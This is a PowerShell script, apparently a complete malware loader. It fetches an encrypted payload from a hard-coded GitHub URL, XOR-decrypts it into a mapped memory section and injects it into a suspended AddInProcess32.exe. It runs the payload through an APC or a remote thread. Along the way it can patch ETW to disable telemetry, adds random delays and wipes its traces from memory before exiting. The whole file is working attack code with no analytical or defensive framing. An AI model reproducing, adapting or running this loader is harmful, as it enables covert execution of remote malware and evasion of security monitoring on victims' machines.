param(
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",
    [string]$Key = "",
    [switch]$RequireRWX,
    [switch]$UseApc,
    [switch]$PatchEtw
)

function Write-Log {
    param([string]$Message)
    Write-Host "[$(Get-Date -Format 'HH:mm:ss.fff')] $Message"
}

# ============================================================
# Stage 0: Disable telemetry before anything else
# ============================================================

Write-Log "Loading native helpers via reflection..."

$win32Native = [System.Type]::GetType('Microsoft.Win32.Win32Native')
$gMH = $win32Native.GetMethod('GetModuleHandle', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([string]), $null)
$gPA = $win32Native.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([IntPtr], [string]), $null)

function Get-ProcAddress {
    param([string]$Module, [string]$Name)
    $hMod = $gMH.Invoke($null, @($Module))
    if ($hMod -eq [IntPtr]::Zero) { throw "Cannot load $Module" }
    $ptr = $gPA.Invoke($null, @($hMod, $Name))
    if ($ptr -eq [IntPtr]::Zero) { throw "Cannot resolve $Name" }
    return $ptr
}

# Build reflection module early so we can make a VirtualProtect delegate for patching
$ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("E")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$mb = $ab.DefineDynamicModule("M")

function New-DelegateType {
    param([Type]$ReturnType, [Type[]]$Params)
    $tb = $mb.DefineType("D" + [Guid]::NewGuid().ToString("N"), [System.Reflection.TypeAttributes]'Class,Public,Sealed', [System.MulticastDelegate])
    $cb = $tb.DefineConstructor([System.Reflection.MethodAttributes]'Public,HideBySig,SpecialName,RTSpecialName', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
    $cb.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    $im = $tb.DefineMethod("Invoke", [System.Reflection.MethodAttributes]'Public,HideBySig,NewSlot,Virtual', $ReturnType, $Params)
    $im.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    return $tb.CreateType()
}

$D_VirtualProtect = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([uint32]), ([uint32].MakeByRefType()))
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'VirtualProtect'), $D_VirtualProtect)

function Invoke-Patch {
    param([IntPtr]$Address, [byte[]]$Patch)
    $old = 0
    [void]$VirtualProtect.Invoke($Address, [IntPtr]$Patch.Length, 0x40, [ref]$old)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
    [void]$VirtualProtect.Invoke($Address, [IntPtr]$Patch.Length, $old, [ref]$old)
}

# Patch ETW only when requested (can destabilize PowerShell on some builds)
if ($PatchEtw) {
    Write-Log "Patching ETW..."
    try {
        $etw = Get-ProcAddress 'ntdll.dll' 'EtwEventWrite'
        $etwPatch = if ([IntPtr]::Size -eq 8) { [byte[]](0x48, 0x33, 0xC0, 0xC3) } else { [byte[]](0x33, 0xC0, 0xC2, 0x10, 0x00) }
        Invoke-Patch -Address $etw -Patch $etwPatch
        Write-Log "ETW patched at 0x$($etw.ToString('X'))"
    } catch {
        Write-Log "ETW patch failed (continuing): $_"
    }
} else {
    Write-Log "Skipping ETW patch (use -PatchEtw to enable)"
}


# ============================================================
# Stage 1: Build remaining dynamic delegates
# ============================================================

Write-Log "Building dynamic delegates..."

$D_CreateProcessW = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([bool]), ([uint32]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]))
$D_NtCreateSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr].MakeByRefType()), ([uint32]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32]), ([IntPtr]))
$D_NtMapViewOfSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32]), ([uint32]))
$D_NtUnmapViewOfSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]))
$D_NtQueueApcThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]))
$D_NtResumeThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([uint32].MakeByRefType()))
$D_NtCreateThreadEx = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr].MakeByRefType()), ([uint32]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([bool]), ([uint32]), ([uint32]), ([uint32]), ([IntPtr]))
$D_CloseHandle = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]))

$CreateProcessW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CreateProcessW'), $D_CreateProcessW)
$NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtCreateSection'), $D_NtCreateSection)
$NtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtMapViewOfSection'), $D_NtMapViewOfSection)
$NtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtUnmapViewOfSection'), $D_NtUnmapViewOfSection)
$NtQueueApcThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtQueueApcThread'), $D_NtQueueApcThread)
$NtResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtResumeThread'), $D_NtResumeThread)
$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtCreateThreadEx'), $D_NtCreateThreadEx)
$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CloseHandle'), $D_CloseHandle)

# ============================================================
# Stage 2: Download payload
# ============================================================

Write-Log "Downloading payload from $Url ..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
$encrypted = $wc.DownloadData($Url)
$payloadLen = $encrypted.Length
Write-Log "Downloaded $payloadLen bytes"

$keyBytes = $null
if (-not [string]::IsNullOrEmpty($Key)) {
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    Write-Log "Key loaded for in-place decryption"
}

# ============================================================
# Stage 3: Spawn AddInProcess32 suspended
# ============================================================

$hostPath = $null
foreach ($dir in @(
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
    "C:\Windows\Microsoft.NET\Framework\v2.0.50727",
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
    "C:\Windows\Microsoft.NET\Framework64\v2.0.50727"
)) {
    $candidate = Join-Path $dir 'AddInProcess32.exe'
    if (Test-Path $candidate) { $hostPath = $candidate; break }
}
if (-not $hostPath) { throw "AddInProcess32.exe not found" }
Write-Log "Host binary: $hostPath"

Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 1600)

$siSize = if ([IntPtr]::Size -eq 8) { 104 } else { 68 }
$piSize = if ([IntPtr]::Size -eq 8) { 24 } else { 16 }
$siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, 0, $siSize)
for ($i = 4; $i -lt $siSize; $i += 8) { [System.Runtime.InteropServices.Marshal]::WriteInt64($siPtr, $i, 0) }
for ($i = 0; $i -lt $piSize; $i += 8) { [System.Runtime.InteropServices.Marshal]::WriteInt64($piPtr, $i, 0) }

$cmdLine = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni('"' + $hostPath + '"')
try {
    $ok = $CreateProcessW.Invoke([IntPtr]::Zero, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000004, [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
} finally {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cmdLine)
}
if (-not $ok) { throw "CreateProcessW failed" }

$hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
$hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
$procId = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)
Write-Log "Suspended AddInProcess32 spawned. PID: $procId"

# ============================================================
# Stage 4: Inject via section mapping
# ============================================================

Write-Log "Creating executable section..."
$sectionSize = [IntPtr]$payloadLen
$sectionHandle = [IntPtr]::Zero
$status = $NtCreateSection.Invoke([ref]$sectionHandle, 0xF001F, [IntPtr]::Zero, [ref]$sectionSize, 0x40, 0x8000000, [IntPtr]::Zero)
if ($status -ne 0) { throw "NtCreateSection failed: 0x$($status.ToString('X8'))" }
Write-Log "Section handle: 0x$($sectionHandle.ToString('X'))"

Write-Log "Mapping local RW view and decrypting directly into section memory..."
$localBase = [IntPtr]::Zero
$viewSize = [IntPtr]$payloadLen
$status = $NtMapViewOfSection.Invoke($sectionHandle, [IntPtr](-1), [ref]$localBase, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 1, 0, 0x04)
if ($status -ne 0) { throw "NtMapViewOfSection(local) failed: 0x$($status.ToString('X8'))" }

# Decrypt/copy directly into mapped memory so plaintext never lives in managed heap
if ($keyBytes -ne $null) {
    for ($i = 0; $i -lt $payloadLen; $i++) {
        $b = $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length]
        [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($localBase.ToInt64() + $i), $b)
    }
} else {
    [System.Runtime.InteropServices.Marshal]::Copy($encrypted, 0, $localBase, $payloadLen)
}

$status = $NtUnmapViewOfSection.Invoke([IntPtr](-1), $localBase)
if ($status -ne 0) { throw "NtUnmapViewOfSection failed: 0x$($status.ToString('X8'))" }
Write-Log "Local view unmapped; plaintext no longer in PowerShell address space"

Write-Log "Wiping local ciphertext and key from PowerShell memory..."
if ($encrypted -ne $null -and $encrypted.Length -gt 0) {
    [System.Array]::Clear($encrypted, 0, $encrypted.Length)
    $encrypted = $null
}
if ($keyBytes -ne $null -and $keyBytes.Length -gt 0) {
    [System.Array]::Clear($keyBytes, 0, $keyBytes.Length)
    $keyBytes = $null
}
$wc = $null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
[System.GC]::Collect()

Write-Log "Mapping remote executable view into target..."
$remoteBase = [IntPtr]::Zero
$viewSize = [IntPtr]$payloadLen
$execProtect = if ($RequireRWX) { 0x40 } else { 0x20 }
$status = $NtMapViewOfSection.Invoke($sectionHandle, $hProcess, [ref]$remoteBase, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 1, 0, $execProtect)
if ($status -ne 0) { throw "NtMapViewOfSection(remote) failed: 0x$($status.ToString('X8'))" }
[void]$CloseHandle.Invoke($sectionHandle)
Write-Log "Remote executable view mapped at 0x$($remoteBase.ToString('X')) (protect=0x$($execProtect.ToString('X')))"

# ============================================================
# Stage 5: Execute and exit immediately
# ============================================================

if ($UseApc) {
    Write-Log "Queueing APC on suspended main thread..."
    $status = $NtQueueApcThread.Invoke($hThread, $remoteBase, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtQueueApcThread failed: 0x$($status.ToString('X8'))" }
    Write-Log "APC queued; resuming main thread..."
    $suspendCount = 0
    $status = $NtResumeThread.Invoke($hThread, [ref]$suspendCount)
    if ($status -ne 0) { throw "NtResumeThread failed: 0x$($status.ToString('X8'))" }
    Write-Log "Main thread resumed"
} else {
    Write-Log "Creating remote thread via NtCreateThreadEx..."
    $threadHandle = [IntPtr]::Zero
    $status = $NtCreateThreadEx.Invoke([ref]$threadHandle, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $remoteBase, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtCreateThreadEx failed: 0x$($status.ToString('X8'))" }
    [void]$CloseHandle.Invoke($threadHandle)
    Write-Log "Remote thread created"
}

# Close handles and bail — no watchdog, no monitoring
[void]$CloseHandle.Invoke($hThread)
[void]$CloseHandle.Invoke($hProcess)
Write-Log "Injection complete. Exiting PowerShell immediately."
Exit
